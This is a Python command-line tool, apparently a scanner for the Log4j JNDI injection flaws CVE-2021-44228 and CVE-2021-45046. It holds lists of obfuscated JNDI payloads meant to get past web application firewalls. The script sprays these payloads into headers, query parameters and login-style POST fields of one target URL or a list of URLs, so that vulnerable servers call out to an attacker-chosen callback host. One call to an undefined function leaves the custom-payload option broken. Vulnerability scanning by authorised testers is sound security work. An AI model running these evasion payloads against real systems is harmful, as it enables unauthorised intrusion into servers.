#!/usr/bin/env python3
try:
	import argparse
	import random
	import requests
	import os
	import sys
	import base64
	from termcolor import cprint
	from urllib.parse import urlparse
except:
	print("[-] Requirement not satisfied. For more info check requirement.txt")
	print("[-] Exiting!!!!")
	sys.exit()





# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


#To determine python version running in your system
if sys.version_info < (3,0):
    print("[-] Sorry requires python 3.x")
    print("[-] Exiting!!!!")
    sys.exit(1)

cprint('[*] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")


#checking for command_line arguments
if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)



inbuilt_waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}/",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
                       ]


cve_2021_45046_payloads = [
                           "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                           "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                           "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                          ]   


post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]

parsar=argparse.ArgumentParser(description="Usage : ./log4jscan.py [options- URL/list_of_URL] [target_specification ] [options-custom_dns_callback_host] [id_of_custom_dns_callback_host] ",
							  epilog="Example : ./log4jscan.py -u http://127.0.0.1:8080/ -id c9d9k5c2vtc00002me60grsw31ayyyyyb.interact.sh")

parsar.add_argument("-u","--url",
					dest="url",
					help="Scan a single URL\n",
					)

parsar.add_argument("-l","--list",
					dest="list",
					help="Scan multiple URL from file\n",
					)

parsar.add_argument("-id","--custom_dns_callback_host",
					dest="callback_host",
					help="Custom dns callback provider ID\n",
					required=True)

parsar.add_argument("--test_cve_2021_45046",
					dest="cve_45046_payload",
					action="store_true",
					help="Test with CVE 2021 45046 Payloads only. Using this option will not test with custom Payload as well as inbuilt payload [Deafult: False]\n")

parsar.add_argument("-hf","--header_file",
					dest="header_file",
					default="header",
					help="Path for Header file to fuzz [ Default : header.txt]\n")

parsar.add_argument("--request_type",
					dest="request",
					default="GET",
					help="GET or POST type request [Default: GET]\n")

parsar.add_argument("--run_all_test",
					dest="all_test",
					action="store_true",
					help="Run all possible test for LOG4j(all payloads , all requests) [Default: False]\n")

parsar.add_argument("--include_wafbypass_payload",
					dest="include_inbuilt_payload",
					action="store_true",
					help="To include firewall bypass payloads [Default: False]\n")
					
parsar.add_argument("--custom_payload_list",
					dest="custom_payload",
					help="Path for custom payload file.\n")


args=parsar.parse_args()


def get_POST_parameter(payload):
	post_parameter={}
	for para in post_data_parameters:
		post_parameter.update({para: payload})
	
	return post_parameter


def get_fuzzing_header(payload):
	if not os.path.exists(args.header_file):
		cprint(f"[-] Error Header Path: {args.header_file} not Found!!!!",'red')
		cprint(f"[-] Exiting!!!!", 'red')
		sys.exit()
		
	fuzzing_headers={}
	
	with open(args.header_file,'r') as f:
		for i in f.readlines():
			i=i.strip()
			if i=="":
				continue
			fuzzing_headers.update({i: payload})
		
	if "Referer" in fuzzing_headers:
		fuzzing_headers["Referer"]=f"https://{fuzzing_headers['Referer']}"
		
	return fuzzing_headers
			


def get_inbuilt_payloads(callback_host,random_string):

	payloads=[]
	
	for waf_payload in inbuilt_waf_bypass_payloads:
		new_payload=waf_payload.replace("{{callback_host}}",callback_host)
		new_payload=new_payload.replace("{{random}}",random_string)
		payloads.append(new_payload)
	
	return payloads



def get_cve_45046_payloads(callback_host,random_string):
	payloads=[]
	for payload in cve_2021_45046_payloads:
		new_payload=payload.replace("{{callback_host}}",callback_host)
		new_payload=new_payload.replace("{{random}}",random_string)
		payloads.append(new_payload)
	
	return payloads
		
		


def get_custom_payloads(path):
	payloads=[]
	
	if not os.path.exists(path):
		cprint(f"[-] Error Custom Payload Path not Found!!!!",'red')
		cprint(f"[-] Exiting!!!!", 'red')
		sys.exit()
		
	with open(path,'r') as f:
		for i in f.readlines():
			i=i.strip()
			
			if i=="":
				continue
			
			payloads.append(i)
	
	return payloads
	 

def parse_url(domain):
	url=domain
	header = {"User-Agent" : "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13"}
	if "://" not in url:
		temp=1
		while( temp!=0):
			protocol=input("Does the domain have ssl certificate [y/n] --> ")
			if protocol=='y':
				url=str("https://")+str(url)
				temp=0
			elif protocol=='n':
				url=str("http://")+str(url)
				temp=0
			else:
				cprint(f"[#] Please enter valid argument !!!",'cyan')
	
	cprint(f"[*] Checking if Host:{url} is reachable...","yellow")
	response=requests.get(url=url,headers=header,verify=False)
	
	if response.status_code!=200:
		cprint(f"[-] Error cannot reach the Host: {url}","red")
		
	scheme=urlparse(url).scheme
	file_path=urlparse(url).path
	if file_path=="":
		file_path="/"
	
	return ({'url': url, 
			'status_code': response.status_code , 
			'host': urlparse(url).netloc.split(":")[0]})	
	

def scan_url(callback_host,url):
	parsed_url=parse_url(url)
	random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
	payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
	payloads = [payload]
	
	#if parsed_url['status_code']!=200:
	#	return
	
	# Generating Payloads.....
	if args.all_test:
		cprint(f"[*] Generating inbuilt WAF Bypass Payloads...",'green')
		payloads.extend(get_inbuilt_payloads(f'{parsed_url["host"]}.{callback_host}',random_string))
		cprint(f"[*] Generating CVE 2021 45046 Payloads...",'green')
		payloads.extend(get_cve_45046_payloads(f'{parsed_url["host"]}.{callback_host}',random_string))
		if args.custom_payload:
			cprint(f"[*] Generating Custom Payloads...",'green')
			payloads.extend(get_custom_payload(args.custom_payload))
	
	if args.cve_45046_payload==True:
		cprint(f"[*] Generating CVE 2021 45046 Payloads...",'green')
		payloads.extend(get_cve_45046_payloads(f'{parsed_url["host"]}.{callback_host}',random_string))
	
	if args.include_inbuilt_payload==True:
		cprint(f"[*] Generating inbuilt WAF Bypass Payloads...",'green')
		payloads.extend(get_inbuilt_payloads(f'{parsed_url["host"]}.{callback_host}',random_string))
	
	if args.custom_payload:
		cprint(f"[*] Generating Custom Payloads...",'green')
		payloads.extend(get_custom_payload(args.custom_payload))
	
	# Sending Request.......
	
	for payload in payloads:
		
		
		#cprint(f"[*] URL: {parsed_url['url']} | PAYLOAD: {payload}", "cyan")
		
		if args.request.upper()=="GET" or args.all_test:
			try:
				cprint(f"[*] Sending GET Request : {parsed_url['url']} For payload:{payload} ",'green')
				resp=requests.request(url=parsed_url['url'],
								method="GET",
								params={"para": payload},
								headers=get_fuzzing_header(payload),
								verify=False)
							 
				print(f"Request response code : {resp.status_code}")
		
			except Exception as e:
				cprint(f"GET EXCEPTION: {e}")
		

		if args.request.upper()=="POST" or args.all_test:
			try:
				cprint(f"[*] Sending POST Request : {parsed_url['url']} For payload:{payload} ",'green')
				resp=requests.request(url=parsed_url['url'],
							method="POST",
							data=get_POST_parameter(payload),
							headers=get_fuzzing_header(payload),
							params={"para": payload},
							verify=False)
				print(f"Request response code : {resp.status_code}")
			except Exception as e:
				cprint(f"POST EXCEPTION: {e}")
			
		#For JSON Body
			try: 
				cprint(f"[*] Sending POST Request : {parsed_url['url']} For payload:{payload} ",'green')
				resp=requests.request(url=parsed_url['url'],
							method="POST",
							json=get_POST_parameter(payload),
							headers=get_fuzzing_header(payload),
							params={"para": payload},
							verify=False)
						 
				print(f"Request response code : {resp.status_code}")
			except Exception as e:
				cprint(f"POST EXCEPTION: {e}")
		

def main():
	urls=[]
	if args.url:
		urls.append(args.url)
	if args.list:
		if not os.path.exists(args.list):
			cprint(f"[-] Error URL list Path: {args.list} not Found!!!!",'red')
			cprint(f"[-] Exiting!!!!", 'red')
			sys.exit() 
		else:
			with open(args.list,'r') as f:
				for i in f.readlines():
					i=i.strip()
					if i=="":
						continue
					urls.append(i) 
	
	if args.callback_host:
		cprint("[*] Sending Payloads to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability....", "yellow")
	
	for url in urls:
		scan_url(args.callback_host,url)
	
	cprint("[+] Scan Completed. Check Custom DNS Callback host if any ping received",'cyan')
		
if __name__=="__main__":
	try:
		main()
	except KeyboardInterrupt:
		cprint("\nKeyboardInterrupt Detected.",'red')
		print("Exiting...")
		exit(0)
		
			

